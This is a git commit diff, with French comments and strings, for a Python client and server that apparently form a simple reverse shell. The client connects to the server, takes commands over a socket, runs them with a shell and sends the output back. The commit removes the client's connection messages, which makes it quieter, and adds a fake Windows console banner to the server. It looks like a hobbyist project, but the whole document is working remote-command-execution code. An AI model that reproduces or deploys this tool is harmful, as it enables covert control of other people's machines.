49621567f2ec781628beea3cb19600a73f6fa438
Coni <deknicolas1911@gmail.com>
2019-08-31 20:55:34 +0200

    Decode sur Windows mais ne marche pas sur Linux :'(

--- client.py
+++ client.py
@@ -1,19 +1,17 @@
 import socket, os, subprocess, time
 boucle = True
-hote = "localhost"
-port = 1911
+hote = "127.0.0.1"
+port = 25565
 clearconsole = "cls"
-nothing = "commande sans output".encode()
+nothing = " ".encode()
 
 os.system(clearconsole)
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 while boucle is True:
     try:
-        print("connexion..")
         socket.connect((hote, port))
         os.system(clearconsole)
-        print("Connecté !")
         boucle = False
     except ConnectionRefusedError:
         time.sleep(3)
@@ -26,27 +24,34 @@ while boucle is True:
     jesuisou = os.getcwd().encode()
     socket.send(jesuisou)
     
-    commande = socket.recv(50).decode()
-    if commande != "closeserverclient":
-        stderr = b''
-        stdout = b''
-        if 'cd' in commande:
-            derniereLettre = commande[-1]
-            directory = commande[3:-1]+derniereLettre
-            try:
-                os.chdir(directory)
-            except FileNotFoundError:
-                stdout = b"Le dossier/fichier n'existe pas"
+    try:
+        commande = socket.recv(50).decode()
+        if commande != "closeserverclient":
+            stderr = b''
+            stdout = b''
+            if 'cd' in commande:
+                derniereLettre = commande[-1]
+                directory = commande[3:-1]+derniereLettre
+                try:
+                    os.chdir(directory)
+                except FileNotFoundError:
+                    stdout = b"Le dossier/fichier n'existe pas"
+            else:
+                commande = commande.encode()
+                spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = spl.communicate()
+            if stdout == b'':
+                socket.send(stderr)
+            if stderr == b'':
+                socket.send(stdout)
+            if stdout == b'' and stderr == b'':
+                socket.send(nothing)
+        elif "cls" == commande:
+            socket.send(" ".encode())
+        elif "" == commande:
+            socket.send(" ".encode())
         else:
-            commande = commande.encode()
-            spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = spl.communicate()
-        if stdout == b'':
-            socket.send(stderr)
-        if stderr == b'':
-            socket.send(stdout)
-        if stdout == b'' and stderr == b'':
-            socket.send(nothing)
-    else:
-        boucle = False
+            boucle = False
+    except ConnectionResetError:
+        socket.close()
 socket.close()
--- server.py
+++ server.py
@@ -1,6 +1,6 @@
-import socket
+import socket, os
 hote = ''
-port = 1911
+port = 25565
 boucle = True
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket.bind((hote, port))
@@ -8,18 +8,25 @@ socket.listen(1)
 print("Attendez..")
 
 client, infos_connexion = socket.accept()
+print("Connecté à : ",infos_connexion)
+print("\nMicrosoft Windows [Version 10.0.18362.295]\n(c) 2019 Microsoft Corporation. All rights reserved.\n")
 
 while boucle is True:
     whereiam = client.recv(1024)
     whereiam = whereiam.decode()
-    commande = input(whereiam+"# ")
+    commande = input(whereiam+">")
 
-    if commande != "closeserverclient":
-        commande = commande.encode()
-        client.send(commande)
-        print(client.recv(18000))
-    else:
+    if commande == "closeserverclient":
         boucle = False
+    elif commande == "cls":
+        os.system("cls")
+    elif commande == "":
+        commande = " "
+    commande = commande.encode()
+    client.send(commande)
+    reponse = str( client.recv(9999).decode("utf-8", errors="ignore"))
+    print(reponse)
+        
 
 client.close()
 socket.close()
